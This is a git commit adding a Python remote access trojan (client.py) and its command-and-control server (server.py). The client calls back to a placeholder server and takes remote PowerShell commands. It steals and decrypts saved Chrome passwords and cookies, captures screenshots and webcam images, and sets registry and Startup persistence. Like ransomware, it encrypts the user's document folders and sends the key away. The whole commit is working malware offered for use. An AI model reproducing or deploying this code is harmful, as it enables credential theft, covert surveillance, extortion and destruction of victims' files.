e2946ff6604f6d57b1f256418ef36c28a24b31cd
Joseph Fisher <joseph_n_fisher@hotmail.com>
2023-06-27 21:35:19 -0500

    Initial Commit

---
+++ client.py
@@ -0,0 +1,391 @@
+# replace mss with pyautogui for screenshots
+import socket
+import json
+import subprocess
+import time
+import os
+import shutil
+import sys
+from sys import platform
+from cryptography.fernet import Fernet
+import pickle
+import io
+import cv2
+import getpass
+from PIL import Image
+from mss import mss
+import ssl
+import platform as pform
+import sys
+from datetime import timezone, datetime, timedelta
+import base64
+from win32.win32crypt import CryptUnprotectData
+from Crypto.Cipher import AES
+import sqlite3
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
+s = ssl.wrap_socket(s)
+
+def reliable_recv():
+    data = ''
+    while True:
+        try:
+            data = data + s.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
+
+def reliable_send(data):
+    jsondata = json.dumps(data)
+    s.send(jsondata.encode())
+
+def upload_file(file_name):
+    with open(file_name, 'rb') as f, io.BytesIO() as bs:
+        chunk = f.read(1024)
+        while chunk:
+            bs.write(chunk)
+            chunk = f.read(1024)
+        s.sendall(bs.getvalue())
+
+def download_file(file_name):
+    try:
+        with open(file_name, 'wb') as f:
+            s.settimeout(5)
+            while True:
+                try:
+                    chunk = s.recv(1024)
+                    if chunk:
+                        f.write(chunk)
+                    else:
+                        break
+                except socket.timeout as e:
+                    break
+        s.settimeout(None)
+    except Exception as e:
+        pass
+
+def upload_byte_arr(byte_arr):
+    byte_arr.seek(0)
+    chunk = byte_arr.read(10485760)
+    while chunk:
+        try:
+            s.sendall(chunk)
+        except:
+            pass
+        chunk = byte_arr.read(10485760)
+
+def capture_webcam_picture(name):
+    webcam = cv2.VideoCapture(0)
+    webcam.set(cv2.CAP_PROP_EXPOSURE, 40)
+
+    if not webcam.isOpened():
+        print("No webcam available")
+        return
+    
+    ret, frame = webcam.read()
+
+    if not ret:
+        print("Failed to read frame from webcam")
+        return
+
+    webcam.release()
+    
+    is_success, im_buf_arr = cv2.imencode(".jpg", frame)
+    byte_im = im_buf_arr.tobytes()
+
+    byte_im_io = io.BytesIO(byte_im)
+    upload_byte_arr(byte_im_io)
+
+def screenshot():
+    sct = mss()
+    if platform in ["win32", "darwin", "linux"]:
+        screenshot = sct.grab(sct.monitors[0])
+        img_byte_arr = io.BytesIO()
+        img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
+        img.save(img_byte_arr, format='PNG')
+        img_byte_arr.seek(0)
+        return img_byte_arr
+
+def persist_reg(reg_name, file_name):
+    file_location = os.environ['appdata'] + '\\' + file_name
+    try:
+        if not os.path.exists(file_location):
+            shutil.copyfile(sys.executable, file_location)
+            subprocess.call(
+                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"',
+                shell=True)
+            reliable_send('[+] Created Persistence With Reg Key: ' + reg_name)
+        else:
+            reliable_send('[+] Persistence Already Exists')
+    except:
+        reliable_send('[-] Error Creating Persistence With The Target Machine')
+
+def persist_startup(file_name):
+    startup_folder = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup') + '\\'
+
+    file_location = startup_folder + file_name
+    
+    try:
+        if not os.path.exists(file_location):
+            shutil.copyfile(file_name, file_location)
+            reliable_send('[+] Copied file to the Startup folder: ' + file_name)
+        else:
+            reliable_send('[+] File already exists in the Startup folder')
+    except Exception as e:
+        reliable_send('[-] Error copying file to the Startup folder: ' + str(e))
+
+def is_admin():
+    global admin
+    if platform == 'win32':
+        try:
+            temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
+        except:
+            admin = '[!!] User Privileges!'
+        else:
+            admin = '[+] Administrator Privileges!'
+
+def getKey():
+    key = Fernet.generate_key()
+    return key
+
+def send_key(file_name, key):
+    new_file_name = f'{file_name}.key'
+    s.sendall(pickle.dumps((new_file_name, key)))
+
+def encrypt_file(filename):
+    key = getKey()
+    f = Fernet(key)
+
+    with open(filename, 'rb') as file:
+        file_data = file.read()
+    encrypted_data = f.encrypt(file_data)
+    encrypted_filename = filename + '.fhook'
+
+    with open(encrypted_filename, 'wb') as file:
+        file.write(encrypted_data)
+    send_key(filename, key)
+    os.remove(filename)
+
+def encrypt_file_in_dir(filename, key):
+    f = Fernet(key)
+
+    with open(filename, 'rb') as file:
+        file_data = file.read()
+    encrypted_data = f.encrypt(file_data)
+    encrypted_filename = filename + '.fhook'
+
+    with open(encrypted_filename, 'wb') as file:
+        file.write(encrypted_data)
+    os.remove(filename)
+
+def encrypt_user_dir():
+    key = getKey()
+    path = os.path.expanduser('~')
+    dirs_to_encrypt = ['Documents', 'Pictures', 'Videos', 'OneDrive', 'Downloads', 'Desktop']
+    
+    for directory in dirs_to_encrypt:
+        full_dir_path = os.path.join(path, directory)
+        if os.path.exists(full_dir_path):
+            for foldername, subfolders, filenames in os.walk(full_dir_path):
+                for filename in filenames:
+                    full_path = os.path.join(foldername, filename)
+                    try:
+                        encrypt_file_in_dir(full_path, key)
+                    except PermissionError:
+                        print(f"Permission denied: {full_path}. Skipping file.")
+                        continue
+                    except Exception as e:
+                        print(f"Encryption error: {e}, file: {full_path}")
+        else:
+            print(f"Directory {directory} not found. Skipping.")
+    username = getpass.getuser()
+    username = username.replace(" ", "")
+    send_key(username, key)
+
+def info():
+    hostname = pform.node()
+    username = getpass.getuser()
+    os_name = pform.system()
+    os_version = pform.version()
+    os_architecture = pform.machine()
+    return f'Hostname: {hostname}\nUsername: {username}\nOS: {os_name}\nVersion/Build: {os_version}\nArchitecture: {os_architecture}'
+
+def get_chrome_datetime(chromedate):
+    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
+
+def get_chrome_local_state():
+    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = f.read()
+        local_state = json.loads(local_state)
+        return local_state
+    
+def get_chrome_login_data():
+    return os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
+
+def get_chrome_encryption_key():
+    local_state = get_chrome_local_state()
+    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    key = key[5:]
+    return CryptUnprotectData(key, None, None, None, 0)[1]
+
+def decrypt_chrome_password(password, key):
+    try:
+        iv = password[3:15]
+        password = password[15:]
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        return cipher.decrypt(password)[:-16].decode()
+    except:
+        try:
+            return str(CryptUnprotectData(password, None, None, None, 0)[1])
+        except:
+            return ""
+
+def get_chrome_passwords():
+    key = get_chrome_encryption_key()
+    db_path = get_chrome_login_data()
+    filename = "ChromeData.db"
+    shutil.copyfile(db_path, filename)
+
+    db = sqlite3.connect(filename)
+    cursor = db.cursor()
+    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+    data = ''
+    for row in cursor.fetchall():
+        origin_url = row[0]
+        action_url = row[1]
+        username = row[2]
+        password = decrypt_chrome_password(row[3], key)
+        date_created = row[4]
+        date_last_used = row[5]
+            
+        if username or password:
+            data += (f"Origin URL: {origin_url}\n")
+            data += (f"Action URL: {action_url}\n")
+            data += (f"Username: {username}\n")
+            data += (f"Password: {password}\n")
+        else:
+            continue
+            
+        if date_created != 86400000000 and date_created:
+            data += (f"Creation date: {str(get_chrome_datetime(date_created))}\n")
+        if date_last_used != 86400000000 and date_last_used:
+            data += (f"Last Used: {str(get_chrome_datetime(date_last_used))}\n")
+        data += ("="*50 + "\n")
+    
+    cursor.close()
+    db.close()
+    try:
+        os.remove(filename)
+    except:
+        pass
+
+    byte_array = bytes(data, 'utf-8')
+    return byte_array
+
+def get_chrome_cookies(db=None):
+    from base64 import b64decode
+    from Cryptodome.Cipher.AES import new, MODE_GCM
+    if db is None:
+        from os.path import expandvars
+        db = expandvars('%LOCALAPPDATA%/Google/Chrome/User Data/Default/Network/Cookies')
+    with open(db + '/../../../Local State') as f:
+        key = CryptUnprotectData(b64decode(json.load(f)['os_crypt']['encrypted_key'])[5:])[1]
+    conn = sqlite3.connect(db)
+    conn.create_function('decrypt', 1, lambda v: new(key, MODE_GCM, v[3:15]).decrypt(v[15:-16]).decode())
+    data = dict(conn.execute("SELECT name, decrypt(encrypted_value) FROM cookies"))
+    conn.close()
+    cookies = json.dumps(data, indent=4)
+    byte_array = bytes(cookies, 'utf-8')
+    byte_arr_io = io.BytesIO(byte_array)
+    upload_byte_arr(byte_arr_io)
+
+def get_passwords_and_upload():
+    byte_array = get_chrome_passwords()
+    byte_arr_io = io.BytesIO(byte_array)
+    upload_byte_arr(byte_arr_io)
+
+def shell():
+    while True:
+        command = reliable_recv()
+        action = command.split(' ')[0] if ' ' in command else command
+        args = command[len(action)+1:] if ' ' in command else ''
+        args = args.replace("'", "''")
+        args = args.replace('"', '\"')
+        args = args.replace("\\", "\\\\")
+
+        match action:
+            case 'quit':
+                return
+            case 'help':
+                pass
+            case 'cd':
+                try:
+                    args = args.strip('\"')
+                    os.chdir(args)
+                    reliable_send(os.getcwd())
+                except Exception as e:
+                    reliable_send('[-] Error changing directory: ' + str(e))
+            case 'encrypt':
+                encrypt_file(args)
+            case 'encrypt_user_dir':
+                encrypt_user_dir()
+            case 'webcam':
+                capture_webcam_picture(args)
+            case 'upload':
+                download_file(args)
+            case 'download':
+                upload_file(args)
+            case 'screenshot':
+                img_byte_arr = screenshot()
+                upload_byte_arr(img_byte_arr)
+            case 'reg_persist':
+                reg_name, copy_name = args.split(' ')
+                persist_reg(reg_name, copy_name)
+            case 'startup_persist':
+                persist_startup(args)
+            case 'info':
+                try:
+                    reliable_send(info())
+                except:
+                    reliable_send('Cannot Perform System Info Collection!')
+            case 'chrome_pass':
+                try:
+                    get_passwords_and_upload()
+                except:
+                    reliable_send('Cannot Perform Chrome Password Collection!')
+            case 'chrome_cookies':
+                try:
+                    get_chrome_cookies()
+                except:
+                    reliable_send('Cannot Perform Chrome Cookie Collection!')
+            case 'check':
+                try:
+                    is_admin()
+                    reliable_send(admin + ' platform: ' + platform)
+                except:
+                    reliable_send('Cannot Perform Privilege Check! Platform: ' + platform)
+            case 'start':
+                try:
+                    subprocess.Popen(args, shell=True)
+                    reliable_send('[+] Started!')
+                except:
+                    reliable_send('[-] Failed to start!')
+            case _:
+                execute = subprocess.Popen(['powershell.exe', command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                result = execute.stdout.read() + execute.stderr.read()
+                result = result.decode()
+                reliable_send(result)
+
+def connection():
+    while True:
+        time.sleep(5)
+        try:
+            s.connect(('SERVER IP', 5555))
+            shell()
+            s.close()
+            break
+        except:
+            pass
+
+connection()
---
+++ server.py
@@ -0,0 +1,300 @@
+import socket
+import json
+import os
+import threading
+from cryptography.fernet import Fernet
+import ssl
+
+class Color:
+    RESET = '\033[0m'
+    BLACK = '\033[30m'
+    RED = '\033[31m'
+    GREEN = '\033[32m'
+    YELLOW = '\033[33m'
+    BLUE = '\033[34m'
+    MAGENTA = '\033[35m'
+    CYAN = '\033[36m'
+    WHITE = '\033[37m'
+
+    @staticmethod
+    def get_color(color_code):
+        return color_code + '{}'.format(Color.RESET)
+    
+def banner(version):
+    return((f'''{Color.RED}
+
+    █████      ██░ ██  ▒█████   ▒█████   ██ ▄█▀
+  ▓██        ▒▓██░ ██ ▒██▒  ██▒▒██▒  ██▒ ██▄█▒ 
+  ▒████      ░▒██▀▀██ ▒██░  ██▒▒██░  ██▒▓███▄░ 
+  ░▓█▒        ░▓█ ░██ ▒██   ██░▒██   ██░▓██ █▄ 
+ ▒░▒█░        ░▓█▒░██▓░ ████▓▒░░ ████▓▒░▒██▒ █▄
+ ░ ▒ ░         ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒
+ ░ ░           ▒ ░▒░ ░  ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░
+   ░ ░         ░  ░░ ░░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░ 
+ ░             ░  ░  ░    ░ ░      ░ ░  ░  ░   
+           
+     ''') + (
+        f'''{Color.YELLOW} version: {version}\n''') + (
+        f'''{Color.YELLOW}      by: fishnotphish\n\n''') + (
+        f'''{Color.BLACK}      forked from https://github.com/safesploit/PythonRAT by Safesploit\n{Color.RESET}''')
+    )
+
+def reliable_recv(target):
+    data = ''
+    while True:
+        try:
+            data = data + target.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
+
+def reliable_send(target, data):
+    jsondata = json.dumps(data)
+    target.send(jsondata.encode())
+
+def upload_file(target, file_name):
+    f = open(file_name, 'rb')
+    target.send(f.read())
+
+def download_file(target, file_name, type):
+    f = open(file_name, 'wb')
+    if type == 1:
+        target.settimeout(2)
+        chunk = target.recv(1024)
+        while chunk:
+            f.write(chunk)
+            try:
+                chunk = target.recv(1024)
+            except socket.timeout as e:
+                break
+    elif type == 2:
+        target.settimeout(5)
+        try:
+            chunk = target.recv(10485760)
+        except:
+            pass
+
+        while chunk:
+            f.write(chunk)
+            try:
+                chunk = target.recv(10485760)
+            except:
+                break
+    target.settimeout(None)
+    f.close()
+    if file_name.endswith('.key'):
+        with open(file_name, 'r') as f:
+            key_str = f.read()
+        start = key_str.find(",") + 1
+        end = key_str.find("=") + 1
+        trimmed_key_str = key_str[start:end]
+
+        with open(file_name, 'w') as f:
+            f.write(trimmed_key_str)
+
+def download_encrypted_key(target, file_name):
+    f = open(file_name, 'wb')
+    target.settimeout(20)
+    chunk = target.recv(1024)
+    while chunk:
+        f.write(chunk)
+        try:
+            chunk = target.recv(1024)
+        except socket.timeout as e:
+            break
+    target.settimeout(None)
+    f.close()
+
+def pull_image(target, count, type):
+    if type == 'webcam':
+        directory = './images'
+        if not os.path.exists(directory):
+            os.makedirs(directory)
+        f = open(directory + '/webcam_pic_%d.jpg' % (count), 'wb') 
+    elif type == 'screenshot':
+        directory = './screenshots'
+        if not os.path.exists(directory):
+            os.makedirs(directory)
+        f = open(directory + '/screenshot_%d.png' % (count), 'wb') 
+
+    target.settimeout(10)
+    try:
+        chunk = target.recv(10485760)
+    except Exception as e:
+        print("chunk error:", str(e))
+        pass
+
+    while chunk:
+        f.write(chunk)
+        try:
+            chunk = target.recv(10485760)
+        except socket.timeout as e:
+            break
+    target.settimeout(None)
+    f.close()
+    count += 1
+
+def server_help_manual():
+    print('''\n
+    --------------------------------------------------------------------------------------------------------
+    Session Commands
+    --------------------------------------------------------------------------------------------------------
+    quit                                --> Quit Session With The Target
+    info                                --> General Host Information
+    cd <directory name>                 --> Changes Directory On Target System
+    upload <file name>                  --> Upload File To The Target Machine From Working Dir 
+    download <file name>                --> Download File From Target Machine
+    encrypt <file name>                 --> Encrpyt File in Current Directory and retrieve the key
+    encrypt_user_dir <username>         --> Encrypt User Directory Files and retrieve the key
+                                            Please remove all spaces from username
+                                            timmy turner -> timmyturner
+                                            example: encrypt_user_dir tturner
+                                            this will hang for 20 seconds
+    screenshot                          --> Takes screenshot and sends to server ./screenshots/
+    webcam                              --> Takes picture with webcam and sends to ./images/
+    start <programName>                 --> Spawn Program Using backdoor e.g. 'start notepad'
+    remove_backdoor                     --> Removes backdoor from target!!!
+    reg_persist <RegName> <file name>   --> Create Persistence In Registry
+                                            copies target file from victim cwd to ~/AppData/Roaming/filename
+                                            example: persistence Backdoor windows32.exe
+    startup_persist <file name>         --> Create Persistence In Start Up Folder
+                                            copies target file from victim cwd to Startup folder
+    check                               --> Check If Has User/Administrator Privileges
+    \n''')
+
+def c2_help_manual():
+    print('''\n
+    -------------------------------------------------------------------------------
+    Command and Control Manual
+    -------------------------------------------------------------------------------
+
+    targets                 --> Prints Active Sessions
+    session <session num>   --> Will Connect To Session (background to return)
+    clear                   --> Clear Terminal Screen
+    exit                    --> Quit ALL Active Sessions and Closes C2 Server!!
+    kill <session num>      --> Issue 'quit' To Specified Target Session
+    \n''')
+
+def target_communication(target, ip):
+    first_iteration = True
+    s_count = 0
+    w_count = 0
+    cwd = ''
+
+    while True:
+        if first_iteration == True:
+            reliable_send(target, '(Get-Location).Path')
+            cwd = reliable_recv(target).strip()
+        first_iteration = False
+
+        command = input(f"{Color.RED}* Shell~{ip} {cwd}> {Color.RESET}")
+        reliable_send(target, command)
+        
+        if command == 'quit':
+            break
+        
+        match command.split()[0]:
+            case 'cd':
+                cwd = reliable_recv(target).strip()
+            case 'encrypt':
+                if len(command.split()) > 1:
+                    download_file(target, f'{command.split()[1]}.key', 1)
+            case 'encrypt_user_dir':
+                if len(command.split()) > 1:
+                    download_encrypted_key(target, f'{command.split()[1]}.key')
+            case 'webcam':
+                pull_image(target, w_count, 'webcam')
+                w_count += 1
+            case 'upload':
+                if len(command.split()) > 1:
+                    upload_file(target, command.split()[1])
+            case 'download':
+                if len(command.split()) > 1:
+                    download_file(target, command.split()[1], 1)
+            case 'screenshot':
+                pull_image(target, s_count, 'screenshot')
+                s_count += 1
+            case 'chrome_pass':
+                download_file(target, 'passwords.txt', 2)
+            case 'chrome_cookies':
+                download_file(target, 'cookies.txt', 2)
+            case 'help':
+                server_help_manual()
+            case _:
+                result = reliable_recv(target)
+                print(result)
+
+def accept_connections():
+    while True:
+        if stop_flag:
+            break
+        sock.settimeout(1)
+        try:
+            target, ip = sock.accept()
+            targets.append(target)
+            ips.append(ip)
+            print(f'{Color.RED}{str(ip)} has connected\n{Color.CYAN}[**] Command & Control Center: {Color.RESET}', end="")
+        except:
+            pass
+
+if __name__ == '__main__':
+    targets = []
+    ips = []
+    stop_flag = False
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    # openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+    sock = ssl.wrap_socket(sock, server_side=True, keyfile="key.pem", certfile="cert.pem") # add your own 
+    sock.bind(('SERVER IP', 5555))
+    sock.listen(5)
+    t1 = threading.Thread(target=accept_connections)
+    t1.start()
+    print(banner("v1.0"))
+    print(f'{Color.YELLOW}Run "help" command to see the usage manual{Color.RESET}')
+    print(f'{Color.GREEN}[+] Waiting For The Incoming Connections ...{Color.RESET}')
+
+    while True:
+        try:
+            command = input(f'{Color.CYAN}[**] Command & Control Center: {Color.RESET}')
+            if command == 'targets':
+                counter = 0
+                for ip in ips:
+                    print(f'{Color.RED}Session {str(counter)} --- {str(ip)}{Color.RESET}')
+                    counter += 1
+            elif command == 'clear':
+                os.system('clear')
+            elif command[:7] == 'session':
+                try:
+                    num = int(command[8:])
+                    tarnum = targets[num]
+                    tarip = ips[num]
+                    target_communication(tarnum, tarip)
+                except:
+                    print(f'{Color.RED}\n[-] No Session Under That ID Number{Color.RESET}')
+            elif command == 'exit':
+                for target in targets:
+                    reliable_send(target, 'quit')
+                    target.close()
+                sock.close()
+                stop_flag = True
+                t1.join()
+                break
+            elif command[:4] == 'kill':
+                targ = targets[int(command[5:])]
+                ip = ips[int(command[5:])]
+                reliable_send(targ, 'quit')
+                targ.close()
+                targets.remove(targ)
+                ips.remove(ip)
+            elif command[:4] == 'help':
+                c2_help_manual()
+            else:
+                print(f'{Color.RED}[!!] Command Doesnt Exist{Color.RESET}')
+        except (KeyboardInterrupt, SystemExit):
+            if input('\nDo you want to exit? yes/no: ') == 'yes':
+                sock.close()
+                print(f'{Color.YELLOW}\n[-] C2 Socket Closed! Bye!!{Color.RESET}')
+                break
+        except ValueError as e:
+            print(f'{Color.RED}[!!] ValueError: {str(e)}{Color.RESET}')
+            continue
